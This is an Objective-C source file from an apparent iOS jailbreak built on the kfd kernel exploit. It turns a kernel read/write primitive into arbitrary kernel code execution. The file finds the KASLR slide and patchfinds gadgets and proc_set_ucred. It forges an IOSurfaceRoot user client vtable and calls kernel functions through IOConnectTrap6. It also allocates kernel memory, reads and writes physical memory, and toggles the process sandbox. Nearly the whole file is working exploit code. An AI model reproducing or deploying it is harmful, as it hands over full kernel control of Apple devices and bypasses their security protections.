//
//  krw.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import "krw.h"
#import "../libkfd.h"
#import "offsets.h"
#import "sandbox.h"
#import "ipc.h"
#import "common/KernelRwWrapper.h"
#import "stage2.h"
#import "KernelRwWrapper.h"
#import "jailbreakd.h"
#import "stage2.h"
#import <mach/mach.h>
#import <mach-o/dyld.h>
#import <mach-o/getsect.h>
#import <mach-o/loader.h>
#import <mach-o/nlist.h>
#import <mach-o/reloc.h>

uint64_t IOConnectTrap6(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);

uint64_t _kfd = 0;

uint64_t _self_task = 0;
uint64_t _self_proc = 0;
uint64_t _kslide = 0;
uint64_t _kern_proc = 0;
uint64_t _kern_pmap = 0;

uint64_t _fake_vtable = 0;
uint64_t _fake_client = 0;
mach_port_t _user_client = 0;

uint64_t get_selftask(void) {
    return _self_task;
}

uint64_t get_selfproc(void) {
    return _self_proc;
}

uint64_t get_kslide(void) {
    return _kslide;
}

uint64_t get_kernproc(void) {
    return _kern_proc;
}

uint64_t get_kernpmap(void) {
    return _kern_pmap;
}

void set_selftask(void) {
    _self_task = ((struct kfd*)_kfd)->info.kernel.current_task;
}

void set_selfproc(void) {
    _self_proc = ((struct kfd*)_kfd)->info.kernel.current_proc;
}

void set_kslide(void) {
    _kslide = ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

void set_kernproc(void) {
    _kern_proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}

void set_kernpmap(void) {
    _kern_pmap = ((struct kfd*)_kfd)->info.kernel.kernel_pmap;
}

uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
    
    set_selftask();
    set_selfproc();
    set_kslide();
    set_kernproc();
    set_kernpmap();
    
    _offsets_init();
    initKernRw(get_selftask(), kread64, kwrite64);
    printf("isKernRwReady: %d\n", isKernRwReady());
    
    return _kfd;
}

void do_kclose(void)
{
    kclose(_kfd);
}

void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
    if(kread8(where) != what) {
        printf("[DEBUG] mismatch! where: 0x%llu now: %hhu what: %hhu",where, kread8(where), what);
    }
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
    if(kread16(where) != what) {
        printf("[DEBUG] mismatch! where: 0x%llu now: %u what: %hu",where, kread16(where), what);
    }
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
    if(kread32(where) != what) {
        printf("[DEBUG] mismatch! where: 0x%llu now: %u what: %u",where, kread32(where), what);
    }
}

void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
    if(kread64(where) != what) {
        printf("[DEBUG] mismatch! where: 0x%llu now: %llu what: %llu",where, kread64(where), what);
    }
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

void kwritebuf(uint64_t kaddr, void* input, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t inputOffset = 0;
    unsigned char* inputBytes = (unsigned char*)input;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t toWrite = 0;
        int bc = 4;
        
        uint64_t remainingBytes = endAddr - curAddr;
        if(remainingBytes < 4)
        {
            toWrite = kread32(curAddr);
            bc = (int)remainingBytes;
        }
        
        unsigned char* wb = (unsigned char*)&toWrite;
        for(int i = 0; i < bc; i++)
        {
            wb[i] = inputBytes[inputOffset];
            inputOffset++;
        }

        kwrite32(curAddr, toWrite);
    }
}

//Thanks @Mineek too!
static uint64_t textexec_text_addr = 0, textexec_text_size = 0;
static uint64_t prelink_text_addr = 0, prelink_text_size = 0;

static unsigned char *
boyermoore_horspool_memmem(const unsigned char* haystack, size_t hlen,
                           const unsigned char* needle,   size_t nlen)
{
    size_t last, scan = 0;
    size_t bad_char_skip[UCHAR_MAX + 1]; /* Officially called:
                                          * bad character shift */

    /* Sanity checks on the parameters */
    if (nlen <= 0 || !haystack || !needle)
        return NULL;

    /* ---- Preprocess ---- */
    /* Initialize the table to default value */
    /* When a character is encountered that does not occur
     * in the needle, we can safely skip ahead for the whole
     * length of the needle.
     */
    for (scan = 0; scan <= UCHAR_MAX; scan = scan + 1)
        bad_char_skip[scan] = nlen;

    /* C arrays have the first byte at [0], therefore:
     * [nlen - 1] is the last byte of the array. */
    last = nlen - 1;

    /* Then populate it with the analysis of the needle */
    for (scan = 0; scan < last; scan = scan + 1)
        bad_char_skip[needle[scan]] = last - scan;

    /* ---- Do the matching ---- */

    /* Search the haystack, while the needle can still be within it. */
    while (hlen >= nlen)
    {
        /* scan from the end of the needle */
        for (scan = last; haystack[scan] == needle[scan]; scan = scan - 1)
            if (scan == 0) /* If the first byte matches, we've found it. */
                return (void *)haystack;

        /* otherwise, we need to skip some bytes and start again.
           Note that here we are getting the skip value based on the last byte
           of needle, no matter where we didn't match. So if needle is: "abcd"
           then we are skipping based on 'd' and that value will be 4, and
           for "abcdd" we again skip on 'd' but the value will be only 1.
           The alternative of pretending that the mismatched character was
           the last character is slower in the normal case (E.g. finding
           "abcd" in "...azcd..." gives 4 by using 'd' but only
           4-2==2 using 'z'. */
        hlen     -= bad_char_skip[haystack[last]];
        haystack += bad_char_skip[haystack[last]];
    }

    return NULL;
}

void init_kernel(struct kfd* kfd) {
    uint64_t kernel_base = get_kslide() + 0xFFFFFFF007004000;
    get_kernel_section(kfd, kernel_base, "__TEXT_EXEC", "__text", &textexec_text_addr, &textexec_text_size);
    assert(textexec_text_addr != 0 && textexec_text_size != 0);
    get_kernel_section(kfd, kernel_base, "__PLK_TEXT_EXEC", "__text", &prelink_text_addr, &prelink_text_size);
    assert(prelink_text_addr != 0 && prelink_text_size != 0);
}

//https://github.com/xerub/patchfinder64/blob/master/patchfinder64.c#L1213-L1229
u64 find_add_x0_x0_0x40_ret(struct kfd* kfd) {
    static const uint8_t insn[] = { 0x00, 0x00, 0x01, 0x91, 0xc0, 0x03, 0x5f, 0xd6 }; // 0x91010000, 0xD65F03C0
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, insn, sizeof(insn));
        if (str) {
            return str - buffer + textexec_text_addr + current_offset;
        }
        current_offset += 0x1000;
    }
    current_offset = 0;
    while (current_offset < prelink_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, prelink_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, insn, sizeof(insn));
        if (str) {
            return str - buffer + prelink_text_addr + current_offset;
        }
        current_offset += 0x1000;
    }
    return 0;
}

uint64_t bof64(uint64_t kfd, uint64_t ptr) {
    for (; ptr >= 0; ptr -= 4) {
        uint32_t op;
        kread(kfd, (uint64_t)ptr, &op, 4);
        if ((op & 0xffc003ff) == 0x910003FD) {
            unsigned delta = (op >> 10) & 0xfff;
            if ((delta & 0xf) == 0) {
                uint64_t prev = ptr - ((delta >> 4) + 1) * 4;
                uint32_t au;
                kread(kfd, (uint64_t)prev, &au, 4);
                if ((au & 0xffc003e0) == 0xa98003e0) {
                    return prev;
                }
                while (ptr > 0) {
                    ptr -= 4;
                    kread(kfd, (uint64_t)ptr, &au, 4);
                    if ((au & 0xffc003ff) == 0xD10003ff && ((au >> 10) & 0xfff) == delta + 0x10) {
                        return ptr;
                    }
                    if ((au & 0xffc003e0) != 0xa90003e0) {
                        ptr += 4;
                        break;
                    }
                }
            }
        }
    }
    return 0;
}

u64 find_proc_set_ucred_function(struct kfd* kfd) {
    // We find the place that sets up the call to zalloc_ro_mut.
    /*
    a0008052   mov     w0, #0x5
    e10302aa   mov     x1, x2
    02048052   mov     w2, #0x20 <-- 0x20 is the offset of ucred on iOS 15.
    04018052   mov     w4, #0x8
    bl zalloc_ro_mut
    */
    const uint8_t data[16] = { 0xa0, 0x00, 0x80, 0x52, 0xe1, 0x03, 0x02, 0xaa, 0x02, 0x04, 0x80, 0x52, 0x04, 0x01, 0x80, 0x52 };
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, data, sizeof(data));
        if (str) {
            uint64_t bof = bof64((u64)kfd, str - buffer + textexec_text_addr + current_offset);
            //return str - buffer + textexec_text_addr + current_offset;
            return bof;
        }
        current_offset += 0x1000;
    }
    return 0;
}

void mineekpf(u64 kfd) {
    struct kfd* kfd_struct = (struct kfd*)kfd;
    printf("patchfinding!\n");
    init_kernel(kfd_struct);
    off_add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret(kfd_struct);
    printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", off_add_x0_x0_0x40_ret);
    assert(off_add_x0_x0_0x40_ret != 0);
    off_proc_set_ucred = find_proc_set_ucred_function(kfd_struct);
    printf("proc_set_ucred_func @ 0x%llx\n", off_proc_set_ucred);
    assert(off_proc_set_ucred != 0);
    printf("patchfinding complete!\n");
}

uint64_t zm_fix_addr_kalloc(uint64_t addr) {
    //se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8; 6s 15.4.1 = 0xFFFFFFF0070FF160
    //XXX guess what is that address xD
    uint64_t kmem = off_unknown + get_kslide();
    uint64_t zm_alloc = kread64(kmem);    //idk?
    uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;

    return (zm_stripped | ((addr) & 0xffffffff));
}

//Thanks @Mineek!
uint64_t init_kcall(void) {
    uint64_t add_x0_x0_0x40_ret_func = 0;
    if(off_p_ucred == 0){
        add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret;
    } else {
        add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
    }
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
      printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    _user_client = 0;
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &_user_client);
    if (err != KERN_SUCCESS){
      printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    IOObjectRelease(service);
    uint64_t uc_port = port_name_to_ipc_port(_user_client);
    uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);    //#define IPC_PORT_IP_KOBJECT_OFF
    uint64_t uc_vtab = kread64(uc_addr);
    
    if(off_p_ucred == 0) {
        if(_fake_vtable == 0) _fake_vtable = mineek_dirty_kalloc(0x1000);
    } else {
        if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
    }
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(_fake_vtable+i*8, kread64(uc_vtab+i*8));
    }
    
    if(off_p_ucred == 0) {
        if(_fake_client == 0) _fake_client = mineek_dirty_kalloc(0x2000);
    } else {
        if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
    }
    
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(_fake_client+i*8, kread64(uc_addr+i*8));
    }
    kwrite64(_fake_client, _fake_vtable);
    kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);

    return 0;
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(_fake_client+0x40);
    uint64_t offx28 = kread64(_fake_client+0x48);
    kwrite64(_fake_client+0x40, x0);
    kwrite64(_fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(_user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(_fake_client+0x40, offx20);
    kwrite64(_fake_client+0x48, offx28);
    return returnval;
}

uint64_t kalloc(size_t ksize) {
    uint64_t allocated_kmem = kcall(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
    return zm_fix_addr_kalloc(allocated_kmem);
}

void kfree(uint64_t kaddr, size_t ksize) {
    kcall(off_kfree_data_external + get_kslide(), kaddr, ksize, 0, 0, 0, 0, 0);
}

uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for(int i = 0; i < size; i+=8) {
        kwrite64(addr + i, 0);
    }
    return 0;
}

int kalloc_using_empty_kdata_page(void) {

    //init_kcall();

    uint64_t allocated_kmem[2] = {0, 0};
    allocated_kmem[0] = kalloc(0x1000);
    allocated_kmem[1] = kalloc(0x1000);

    IOServiceClose(_user_client);
    _user_client = 0;
    usleep(10000);

    clean_dirty_kalloc(_fake_vtable, 0x1000);
    clean_dirty_kalloc(_fake_client, 0x1000);
    
    _fake_vtable = allocated_kmem[0];
    _fake_client = allocated_kmem[1];
    printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);

    return 0;
}

int prepare_kcall(void) {
    NSString* save_path = @"/tmp/kfd-arm64.plist";
    if(access(save_path.UTF8String, F_OK) == 0) {
        uint64_t sb = unsandbox(getpid());
        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
        _fake_vtable = [dict[@"kcall_fake_vtable_allocations"] unsignedLongLongValue];
        _fake_client = [dict[@"kcall_fake_client_allocations"] unsignedLongLongValue];
        sandbox(getpid(), sb);
    } else {
        kalloc_using_empty_kdata_page();
        //Once if you successfully get kalloc to use fake_vtable and fake_client,
        //DO NOT use dirty_kalloc again since unstable method.
        uint64_t sb = unsandbox(getpid());
        
        NSDictionary *dictionary = @{
            @"kcall_fake_vtable_allocations": @(_fake_vtable),
            @"kcall_fake_client_allocations": @(_fake_client),
        };
        
        BOOL success = [dictionary writeToFile:save_path atomically:YES];
        if (!success) {
            printf("[-] Failed createPlistAtPath: /tmp/kfd-arm64.plist\n");
            return -1;
        }
        
        sandbox(getpid(), sb);
        printf("Saved fake_vtable, fake_client for kcall.\n");
        printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
    }
    
    init_kcall();
    
    return 0;
}

int kalloc_using_empty_kdata_page_stage2(void) {

    //init_kcall();

    uint64_t allocated_kmem[2] = {0, 0};
    allocated_kmem[0] = kalloc(0x1000);
    allocated_kmem[1] = kalloc(0x2000);

    IOServiceClose(_user_client);
    _user_client = 0;
    usleep(10000);

    clean_dirty_kalloc(_fake_vtable, 0x1000);
    clean_dirty_kalloc(_fake_client, 0x2000);
    
    _fake_vtable = allocated_kmem[0];
    _fake_client = allocated_kmem[1];
    printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);

    return 0;
}

int prepare_kcall_stage2(void) {
    NSString* save_path = @"/tmp/kfd-arm64.plist";
    if(access(save_path.UTF8String, F_OK) == 0) {
        uint64_t sb = unsandbox(getpid());
        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
        _fake_vtable = [dict[@"kcall_fake_vtable_allocations"] unsignedLongLongValue];
        _fake_client = [dict[@"kcall_fake_client_allocations"] unsignedLongLongValue];
        sandbox(getpid(), sb);
    } else {
        kalloc_using_empty_kdata_page_stage2();
        //Once if you successfully get kalloc to use fake_vtable and fake_client,
        //DO NOT use dirty_kalloc again since unstable method.
        
        NSDictionary *dictionary = @{
            @"kcall_fake_vtable_allocations": @(_fake_vtable),
            @"kcall_fake_client_allocations": @(_fake_client),
        };
        
        BOOL success = [dictionary writeToFile:save_path atomically:YES];
        if (!success) {
            printf("[-] Failed createPlistAtPath: /tmp/kfd-arm64.plist\n");
        }
        printf("Saved fake_vtable, fake_client for kcall.\n");
        printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
    }
    
    //init_kcall();
    
    return 0;
}

int term_kcall(void) {
    IOServiceClose(_user_client);
    _user_client = 0;
    
    return 0;
}

uint64_t kvtophys(uint64_t kvaddr){
    uint64_t ret;
    uint64_t src = kvaddr;
    
    uint64_t kernel_pmap_min = kread64(get_kernpmap() + 0x10);
    uint64_t kernel_pmap_max = kread64(get_kernpmap() + 0x18);
    
    uint64_t is_virt_src = src >= kernel_pmap_min && src < kernel_pmap_max;
    if(is_virt_src) {
        ret = kcall(off_pmap_find_phys + get_kslide(), get_kernpmap(), src, 0, 0, 0, 0, 0);
        if(ret <= 0) {
            return 0;
        }
        
        uint64_t phys_src = ((uint64_t)ret << vm_kernel_page_shift) | (src & vm_kernel_page_mask);
        printf("phys_src: 0x%llx\n", phys_src);
        return phys_src;
    }
    return 0;
}

uint64_t physread64(uint64_t pa)
{
    kern_return_t ret;
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;

    u.u32[0] = (uint32_t)kcall(off_ml_phys_read_data + get_kslide(), pa, 4, 0, 0, 0, 0, 0);//(uint32_t)ret;
    u.u32[1] = (uint32_t)kcall(off_ml_phys_read_data + get_kslide(), pa+4, 4, 0, 0, 0, 0, 0);
    return u.u64;
}

void physwrite64(uint64_t paddr, uint64_t value) {
    kcall(off_ml_phys_write_data + get_kslide(), paddr, value, 8, 0, 0, 0, 0);
}
